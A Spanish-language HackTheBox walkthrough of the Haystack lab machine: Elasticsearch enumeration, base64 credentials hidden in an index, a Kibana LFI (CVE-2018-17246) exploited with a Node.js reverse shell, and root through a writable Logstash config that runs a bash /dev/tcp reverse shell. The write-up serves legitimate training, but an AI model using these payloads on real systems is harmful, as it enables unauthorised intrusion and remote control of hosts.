---
title: Haystack
published: 2025-06-10
image: "./logo.png"
tags: [Easy, ElasticSearch, Information Leakage, Kibana, CVE-2018-17246, Abusing Logstash, eWPT, OSCP, OSWE]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- ElasticSearch Enumeration
- Information Leakage
- Kibana Enumeration
- Kibana Exploitation (CVE-2018-17246)
- Abusing Logstash (Privilege Escalation)

### Preparación

- eWPT
- OSCP (Escalada)
- OSWE

***

## Reconocimiento

Para comenzar el reconocimiento de esta máquina usaremos el comando **scan**:

```sh
scan () {
	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
}
```

Esto nos exportará los puertos que estén abiertos para que posteriormente ver las versiones que corren en cada puerto.

```
# Nmap 7.95 scan initiated Sat Jun  7 23:40:47 2025 as: /usr/lib/nmap/nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn -oG nmap/AllPorts 10.10.10.115
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.115 ()   Status: Up
Host: 10.10.10.115 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9200/open/tcp//wap-wsp/// Ignored State: filtered (65532)
# Nmap done at Sat Jun  7 23:41:14 2025 -- 1 IP address (1 host up) scanned in 26.55 seconds
```

Una vez escaneados los puertos **88** y **2222** veremos lo siguiente:

```
# Nmap 7.95 scan initiated Mon Jun  9 09:40:37 2025 as: /usr/lib/nmap/nmap --privileged -p22,80,9200 -sVC -v -oN nmap/Targeted 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods: 
|   Supported Methods: HEAD DELETE GET OPTIONS
|_  Potentially risky methods: DELETE
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
|_http-server-header: nginx/1.12.2

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  9 09:40:53 2025 -- 1 IP address (1 host up) scanned in 15.76 seconds
```

Podemos ver 3 puertos abiertos, SSH, un servidor web en el 80 y el 9200, que si investigamos en páginas como [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html), veremos que es el puerto de **Elasticsearch**.

<pre class="language-json"><code class="lang-json"><strong>{
</strong>  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</code></pre>

## Elasticsearch

Esto es lo que vemos en el puerto 9200 de inicio, lo que nos confirma que estamos ante un Elasticsearch. Si seguimos la guia y vamos a [`http://10.10.10.115:9200/_cat/indices?v`](http://10.10.10.115:9200/_cat/indices?v)&#x20;

```
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

Podemos ver la lista de índices, vamos a ver **qutoes** por ejemplo: [`http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000`](http://10.10.10.115:9200/quotes/_search?pretty=true\&size=1000)&#x20;

```json
{
  "took": 97,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 253,
    "max_score": 1,
    "hits": [
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "14",
        "_score": 1,
        "_source": {
          "quote": "En América se desarrollaron importantes civilizaciones, como Caral (la civilización más antigua de América, la cual se desarrolló en la zona central de Perú), los anasazi, los indios pueblo, quimbaya, nazca, chimú, chavín, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "19",
        "_score": 1,
        "_source": {
          "quote": "Imperios español y portugués en 1790."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "22",
        "_score": 1,
        "_source": {
          "quote": "También se instalaron en América del Sur repúblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habían sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "24",
        "_score": 1,
        "_source": {
          "quote": "En 1804, los esclavos de origen africano de Haití se sublevaron contra los colonos franceses, declarando la independencia de este país y creando el primer estado moderno con gobernantes afroamericanos."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "25",
        "_score": 1,
        "_source": {
          "quote": "A partir de 1809,23​ los pueblos bajo dominio de España llevaron adelante una Guerra de Independencia Hispanoamericana, de alcance continental, que llevó, luego de complejos procesos, al surgimiento de varias naciones: Argentina, Bolivia, Colombia, Costa Rica, Panamá, Chile, Ecuador, El Salvador, Guatemala, Honduras, México, Nicaragua, Paraguay, Perú, Uruguay y Venezuela. En 1844 y 1898 el proceso se completaría con la independencia de República Dominicana y Cuba, respectivamente."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "26",
        "_score": 1,
        "_source": {
          "quote": "En 1816, se conformó un enorme estado independiente sudamericano, denominado Gran Colombia, y que abarcó los territorios de los actuales Panamá, Colombia, Venezuela y Ecuador y zonas de Brasil, Costa Rica, Guyana, Honduras, Nicaragua y Perú. La República se disolvió en 1830."
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "29",
        "_score": 1,
        "_source": {
          "quote": "Tras su emancipación los países de América han seguido un desarrollo dispar entre sí. Durante el siglo XIX, Estados Unidos se afianzó como una potencia de carácter mundial y reemplazó a Europa como poder dominante en la región."
        }
      }...
```

Nos devuelve una lista muy larga. Debido al nombre de la máquina Haystack, podríamos buscar esto mismo:

```json
{
        "_index": "quotes",
        "_type": "quote",
        "_id": "2",
        "_score": 1,
        "_source": {
          "quote": "There's a needle in this haystack, you have to search for it"
        }
},
```

Encontraremos esto, por lo que podríamos buscar aquí. Teniendo en cuenta que las quotes están en español, yo buscaría cosas como contraseña, clave, usuario, o cosas así que nos puedan dar información. Buscando por clave encontramos 2 referencias:

```json
{
        "_index": "quotes",
        "_type": "quote",
        "_id": "111",
        "_score": 1,
        "_source": {
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
        }
},
{
        "_index": "quotes",
        "_type": "quote",
        "_id": "45",
        "_score": 1,
        "_source": {
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
        }
},
```

Parece que está en Base 64. Si lo decodificamos veremos lo siguiente:

```bash
❯ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
pass: spanish.is.key
❯ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d                                                                                                                                                                                                                                   ❯ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d
user: security    
```

Intentaremos loguearnos con estas credenciales por SSH:

```sh
❯ ssh security@10.10.10.115
The authenticity of host '10.10.10.115 (10.10.10.115)' can't be established.
ED25519 key fingerprint is SHA256:J8TOL2f2yaJILidImnrtW2e2lcroWsFbo0ltI9Nxzfw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.115' (ED25519) to the list of known hosts.
security@10.10.10.115's password: 
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$ ls
user.txt
[security@haystack ~]$ cat user.txt
559dd441d9bdcb7874f...
```

## Escalada de privilegios

Una vez dentro podemos seguir buscando información con `ss -tnl` para ver los puertos abiertos en local:

```
[security@haystack ~]$ ss -tnl
State      Recv-Q Send-Q                                                                               Local Address:Port                                                                                              Peer Address:Port              
LISTEN     0      128                                                                                              *:80                                                                                                           *:*                  
LISTEN     0      128                                                                                              *:9200                                                                                                         *:*                  
LISTEN     0      128                                                                                              *:22                                                                                                           *:*                  
LISTEN     0      128                                                                                      127.0.0.1:5601                                                                                                         *:*                  
LISTEN     0      128                                                                               ::ffff:127.0.0.1:9000                                                                                                        :::*                  
LISTEN     0      128                                                                                             :::80                                                                                                          :::*                  
LISTEN     0      128                                                                               ::ffff:127.0.0.1:9300                                                                                                        :::*                  
LISTEN     0      128                                                                                             :::22                                                                                                          :::*                  
LISTEN     0      50                                                                                ::ffff:127.0.0.1:9600                                                                                                        :::*               
```

Vemos el puerto **5601** en local, que corresponde a **Kibana**. Intentaremos hacer un port forwarding a nuestra máquina con el siguiente comando: `ssh -L 5601:localhost:5601 security@10.10.10.115`

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fkbz90CgBgNiXOwGalcBs%2Fimage.png?alt=media&#x26;token=fa914931-1521-434d-b558-1f7806726d50" alt=""><figcaption><p>Port forwarding de Kibana.</p></figcaption></figure>

### Kibana exploit

Ahí lo tenemos. El [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246) explota un **LFI** de esta versión de Kibana, necesitaremos la reverse shell:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<PORT>, "<IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Una vez con ella, explotaremos el LFI visitando la siguiente ruta:

<pre><code><strong>/api/console/api_server?sense_version=@@SENSE_VERSION&#x26;apis=../../../../../../.../../../../path/to/shell.js
</strong></code></pre>

Obtenemos la reverse shell con el usuario Kibana:

```sh
bash-4.2$ whoami
kibana
```

#### Logstash

Enumerando los procesos podemos ver el **logstash:**

```sh
bash-4.2$ ps awuxx | grep logstash
root       6138 31.7 11.0 2717048 425996 ?      SNsl 06:21   0:57 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
```

Listaremos los permisos que tenemos dentro de `/etc/logstash/conf.d` :

```sh
bash-4.2$ ls -ld /etc/logstash/conf.d/
drwxrwxr-x. 2 root kibana 62 jun 24  2019 /etc/logstash/conf.d/
bash-4.2$ ls -l /etc/logstash/conf.d/ 
total 12
-rw-r-----. 1 root kibana 131 jun 20  2019 filter.conf
-rw-r-----. 1 root kibana 186 jun 24  2019 input.conf
-rw-r-----. 1 root kibana 109 jun 24  2019 output.conf
```

El usuario kibana tiene permisos de escritura, vamos a listar el contenido de cada archivo.

`filter.conf`

```json
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
```

`input.conf`

```json
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
```

`output.conf`

```sh
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
```

Vemos que si conseguimos crear un log en el directorio `/opt/kinbana/logstash_*` con la estructura:

```sh
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" > /opt/kibana/logstash_0xdf
```

Podremos ejecutar comandos con privilegios **root**:

```sh
❯ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.115] 34662
bash: no hay control de trabajos en este shell
[root@haystack /]# whoami
root
```

Después de unos segundos obtendremos la shell con el usuario root, así obtendríamos la flag:

```
[root@haystack ~]# cat root.txt
12ddebdd034276f...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/195)

---